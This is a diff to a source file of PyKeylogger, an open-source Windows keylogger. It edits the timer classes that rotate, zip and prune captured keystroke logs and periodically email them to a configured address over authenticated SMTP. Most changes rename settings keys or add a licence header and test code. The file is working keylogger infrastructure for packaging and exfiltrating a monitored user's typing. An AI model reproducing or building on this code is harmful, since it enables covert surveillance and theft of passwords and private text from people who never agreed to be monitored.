@@ -1,3 +1,25 @@
+##############################################################################
+##
+## PyKeylogger: Simple Python Keylogger for Windows
+## Copyright (C) 2009  nanotube@users.sf.net
+##
+## http://pykeylogger.sourceforge.net/
+##
+## This program is free software; you can redistribute it and/or
+## modify it under the terms of the GNU General Public License
+## as published by the Free Software Foundation; either version 3
+## of the License, or (at your option) any later version.
+##
+## This program is distributed in the hope that it will be useful,
+## but WITHOUT ANY WARRANTY; without even the implied warranty of
+## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+## GNU General Public License for more details.
+##
+## You should have received a copy of the GNU General Public License
+## along with this program.  If not, see <http://www.gnu.org/licenses/>.
+##
+##############################################################################
+
 from threading import Thread, Event
 import logging
 import time
@@ -49,7 +71,7 @@ class BaseTimerClass(Thread):
         self.cmdoptions = _cmdoptions['cmdoptions']
         
         # set this up for clarity
-        self.subsettings = _settings[loggername]
+        self.subsettings = self.settings[loggername]
         
         # set these up here because we will usually need them.
         self.logger = logging.getLogger(self.loggername)
@@ -85,9 +107,8 @@ class LogRotator(BaseTimerClass):
     def __init__(self, *args, **kwargs):
         BaseTimerClass.__init__(self, *args, **kwargs)
         
-        ##TODO: this should be logger-specific
         self.interval = \
-            float(self.subsettings['Log Maintenance']['Log Rotation Interval'])*60*60
+            float(self.subsettings['Log Rotation']['Log Rotation Interval'])*60*60
         
         self.task_function = self.rotate_logs
     
@@ -109,21 +130,15 @@ class LogFlusher(BaseTimerClass):
     def __init__(self, *args, **kwargs):
         BaseTimerClass.__init__(self, *args, **kwargs)
         
-        ##TODO: this should be logger-specific
-        self.interval = float(self.subsettings['Log Maintenance']['Flush Interval'])
+        self.interval = float(self.subsettings['Log Flush']['Flush Interval'])
         
         self.task_function = self.flush_log_write_buffer
     
-    def flush_log_write_buffer(self,
-            log_message="Logger %s: flushing file write buffers with timer."):
-        '''Flushes all relevant log buffers.
+    def flush_log_write_buffer(self):
+        '''Flushes all relevant log buffers.'''
         
-        log_message must contain one string format placeholder '%s'
-        to take the logger name. See default argument value for an example.
-        This string is customizable so that manual flushing can use a 
-        different message.
-        '''
-        logging.getLogger('').debug(log_message % loggername)
+        self.logger.debug("Logger %s: flushing file write buffers." % \
+                            self.loggername)
         for handler in self.logger.handlers:
             self.dir_lock.acquire()
             try:
@@ -141,14 +156,13 @@ class OldLogDeleter(BaseTimerClass):
     def __init__(self, *args, **kwargs):
         BaseTimerClass.__init__(self, *args, **kwargs)
         
-        ##TODO: this should be logger-specific
         self.interval = \
-            float(self.subsettings['Log Maintenance']['Age Check Interval'])*60*60
+            float(self.subsettings['Old Log Deletion']['Age Check Interval'])*60*60
         
         self.task_function = self.delete_old_logs
         
         self.max_log_age = \
-            float(self.subsettings['Log Maintenance']['Max Log Age'])*24*60*60
+            float(self.subsettings['Old Log Deletion']['Max Log Age'])*24*60*60
         
     def delete_old_logs(self):
                 
@@ -183,7 +197,6 @@ class LogZipper(BaseTimerClass):
     def __init__(self, *args, **kwargs):
         BaseTimerClass.__init__(self, *args, **kwargs)
         
-        ##TODO: this should be logger-specific
         self.interval = float(self.subsettings['Zip']['Zip Interval'])*60*60
         
         self.task_function = self.zip_logs
@@ -196,7 +209,7 @@ class LogZipper(BaseTimerClass):
         log_rel_dir = os.path.basename(log_full_dir)
         logfilename = os.path.basename(logfilepath)
         
-        if not self.subsettings['Log Maintenance']['Enable Log Rotation']:
+        if not self.subsettings['Log Rotation']['Enable Log Rotation']:
             lr = LogRotator(self.dir_lock, self.loggername)
             lr.rotate_logs()
             
@@ -221,9 +234,9 @@ class LogZipper(BaseTimerClass):
             myzip.close()
             
             # write the name of the last completed zip file
-            # so that we can check against this when emailing or ftping, to make sure
-            # we do not try to transfer a zipfile which is in the process of being created
-            
+            # so that we can check against this when emailing or ftping, 
+            # to make sure we do not try to transfer a zipfile which is
+            # in the process of being created
             ziplog=open(os.path.join(self.log_full_dir, "_internal_ziplog.txt"), 'w')
             ziplog.write(zipfile_name)
             ziplog.close()
@@ -248,8 +261,7 @@ class EmailLogSender(BaseTimerClass):
     def __init__(self, *args, **kwargs):
         BaseTimerClass.__init__(self, *args, **kwargs)
         
-        ##TODO: this should be logger-specific
-        self.interval = float(self.subsettings['E-mail']['Email Interval'])*60*60
+        self.interval = float(self.subsettings['E-mail']['E-mail Interval'])*60*60
         
         self.task_function = self.send_email
 
@@ -259,7 +271,7 @@ class EmailLogSender(BaseTimerClass):
         We use the email settings specified in the .ini file for the logger.
         '''
 
-        if self.subsettings['Zip']['Zip Enable'] == False:
+        if self.subsettings['Zip']['Enable Zip'] == False:
             lz = LogZipper(self.dir_lock, self.loggername)
             lz.zip_logs()
         
@@ -285,11 +297,12 @@ class EmailLogSender(BaseTimerClass):
         self.dir_lock.acquire()
         try:
             zipfile_list = os.listdir(self.log_full_dir)
+            # removing elements from a list while iterating over it produces 
+            # undesirable results so we make a copy
             zipfile_list_copy = copy.deepcopy(zipfile_list)
             logging.getLogger('').debug(str(zipfile_list))
             if len(zipfile_list) > 0:
-                # removing elements from a list while iterating over it produces 
-                # undesirable results so we do os.listdir again to iterate over
+                
                 for filename in zipfile_list_copy:
                     if not self.needs_emailing(filename):
                         zipfile_list.remove(filename)
@@ -300,12 +313,12 @@ class EmailLogSender(BaseTimerClass):
 
             # set up the message
             msg = MIMEMultipart()
-            msg['From'] = self.subsettings['E-mail']['SMTP From']
-            msg['To'] = COMMASPACE.join(self.subsettings['E-mail']['SMTP To'].split(";"))
+            msg['From'] = self.subsettings['E-mail']['E-mail From']
+            msg['To'] = COMMASPACE.join(self.subsettings['E-mail']['E-mail To'].split(";"))
             msg['Date'] = formatdate(localtime=True)
-            msg['Subject'] = self.subsettings['E-mail']['SMTP Subject']
+            msg['Subject'] = self.subsettings['E-mail']['E-mail Subject']
 
-            msg.attach(MIMEText(self.subsettings['E-mail']['SMTP Message Body']))
+            msg.attach(MIMEText(self.subsettings['E-mail']['E-mail Message Body']))
 
             if len(zipfile_list) == 0:
                 msg.attach(MIMEText("No new logs present."))
@@ -340,8 +353,8 @@ class EmailLogSender(BaseTimerClass):
             if self.subsettings['E-mail']['SMTP Needs Login'] == True:
                 mysmtp.login(self.subsettings['E-mail']['SMTP Username'], 
                         myutils.password_recover(self.subsettings['E-mail']['SMTP Password']))
-            sendingresults = mysmtp.sendmail(self.subsettings['E-mail']['SMTP From'], 
-                    self.subsettings['E-mail']['SMTP To'].split(";"), msg.as_string())
+            sendingresults = mysmtp.sendmail(self.subsettings['E-mail']['E-mail From'], 
+                    self.subsettings['E-mail']['E-mail To'].split(";"), msg.as_string())
             logging.getLogger('').debug("Email sending errors (if any): "
                     "%s \n" % str(sendingresults))
             
@@ -391,13 +404,25 @@ if __name__ == '__main__':
         def print_hello(self, name='bob', *args):
             print "hello, %s" % name
             print args
-            
-    ttc = TestTimerClass('some stuff','more stuff','even more stuff', 'myname', 'some other name')
+    
+    _settings = {'settings':{'loggername':'bla'}}
+    _cmdoptions = {'cmdoptions':'bla'}
+    
+    logger = logging.getLogger('loggername')
+    logpath = '/tmp/throwaway.txt'
+    from myutils import OnDemandRotatingFileHandler
+    loghandler = OnDemandRotatingFileHandler(logpath)
+    loghandler.setLevel(logging.INFO)
+    logformatter = logging.Formatter('%(message)s')
+    loghandler.setFormatter(logformatter)
+    logger.addHandler(loghandler)
+    
+    ttc = TestTimerClass('dirlock','loggername','even more stuff', 'myname', 'some other name')
     ttc.start()
     time.sleep(5)
     ttc.cancel()
 
-    ttc = TestTimerClass()
+    ttc = TestTimerClass('dirlock','loggername')
     ttc.start()
     time.sleep(5)
     ttc.cancel()
